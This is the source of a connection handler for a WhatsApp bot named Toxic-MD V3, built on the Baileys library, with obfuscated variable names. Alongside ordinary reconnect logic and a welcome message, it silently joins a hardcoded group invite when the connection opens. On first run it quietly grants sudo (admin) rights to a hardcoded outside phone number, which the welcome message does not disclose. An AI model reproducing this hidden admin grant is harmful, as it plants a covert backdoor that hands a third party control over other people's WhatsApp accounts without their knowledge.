const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: toxicConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");
const botname = process.env.BOTNAME || "Toxic-MD V3";

const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
  const { connection: _0x115a4c, lastDisconnect: _0x15c83b } = _0x461fdf;

  const _0x166fc0 = () => {
    const _0x18db2f = DateTime.now().setZone("Africa/Nairobi").hour;
    if (_0x18db2f >= 5 && _0x18db2f < 12) {
      return "Rise and shine! 🌅";
    }
    if (_0x18db2f >= 12 && _0x18db2f < 18) {
      return "Midday vibes! ☀️";
    }
    if (_0x18db2f >= 18 && _0x18db2f < 22) {
      return "Evening glow! 🌌";
    }
    return "Night owl mode! 🌙";
  };

  const _0x53a446 = () => {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  };

  if (_0x115a4c === "connecting") {
    console.log("📈 Connecting to WhatsApp and database...");
  }

  if (_0x115a4c === "close") {
    let _0x40b37e = new Boom(_0x15c83b?.error)?.output.statusCode;
    if (_0x40b37e === DisconnectReason.badSession) {
      console.log("Bad Session File, Please Delete Session and Scan Again");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.connectionClosed) {
      console.log("Connection closed, reconnecting....");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.connectionLost) {
      console.log("Connection Lost from Server, reconnecting...");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.connectionReplaced) {
      console.log("Connection Replaced, potentiate Toxic-MD V3");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.loggedOut) {
      console.log("Device Logged Out, Please Delete Session and Scan Again.");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.restartRequired) {
      console.log("Restart Required, Restarting...");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.timedOut) {
      console.log("Connection TimedOut, Reconnecting...");
      _0xd50ec0();
    } else {
      console.log("Unknown DisconnectReason: " + _0x40b37e + " | " + _0x115a4c);
      _0xd50ec0();
    }
  } else if (_0x115a4c === "open") {
    try {
      await _0x218261.groupAcceptInvite("GoXKLVJgTAAC3556FXkfFI");
      console.log("✅ bot running successfully !");
    } catch (error) {
      console.error("❌ Failed to join group:", error.message);
    }
    const _0x1d6f9f = _0x218261.user.id.replace(/:.*/, "").split("@")[0];
    const _0x316865 = await getSettings();
    const _0x1928a7 = await getSudoUsers();

    if (!_0x1928a7.includes(_0x1d6f9f)) {
      await addSudoUser(_0x1d6f9f);
      const _0x531909 = "254735342808";
      if (!_0x1928a7.includes(_0x531909)) {
        await addSudoUser(_0x531909);
      }

      let _0x55d08c = `◈━━━━━━━━━━━━━━━━◈
│❒ *${_0x166fc0()}*
│❒ Yo, you're plugged into *${botname}*! 📡
│❒ ✨ *Bot Name*: ${botname}
│❒ 🔧 *Mode*: ${_0x316865.mode}
│❒ ➡️ *Prefix*: ${_0x316865.prefix}
│❒ 📋 *Commands*: ${totalCommands}
│❒ 🕒 *Time*: ${_0x53a446()}
│❒ 💾 *Database*: Postgres SQL
│❒ 📚 *Library*: Baileys

│❒ *New Connection Alert!* First time here? We've added you to the sudo crew! 😎

│❒ 🚀 *Get Started*:
│❒ - Customize bot with *${_0x316865.prefix}settings*
│❒ - Explore commands with *${_0x316865.prefix}menu*

│❒ *Credits*: Powered by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 🗿
◈━━━━━━━━━━━━━━━━◈`;

      const _0x47c4ef = { text: _0x55d08c };
      await _0x218261.sendMessage(_0x218261.user.id, _0x47c4ef);
    } else {
      let _0x24abe8 = `◈━━━━━━━━━━━━━━━━◈
│❒ *${_0x166fc0()}*

│❒ Welcome back to *${botname}*! 📡

│❒ ✨ *Bot Name*: ${botname}
│❒ 🔧 *Mode*: ${_0x316865.mode}
│❒ ➡️ *Prefix*: ${_0x316865.prefix}
│❒ 📋 *Commands*: ${totalCommands}
│❒ 🕒 *Time*: ${_0x53a446()}
│❒ 💾 *Database*: Postgres SQL
│❒ 📚 *Library*: Baileys

│❒ Ready to dive in? Hit *${_0x316865.prefix}menu* for the full command list! 😎

│❒ *Credits*: Powered by 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧 🗿
◈━━━━━━━━━━━━━━━━◈`;

      const _0x2ca63a = { text: _0x24abe8 };
      await _0x218261.sendMessage(_0x218261.user.id, _0x2ca63a);
    }
    console.log("✅ Connection to WhatsApp and database successful\nLoaded " + totalCommands + " commands.\nToxic-MD V3 is active!");
  }
};

module.exports = connectionHandler;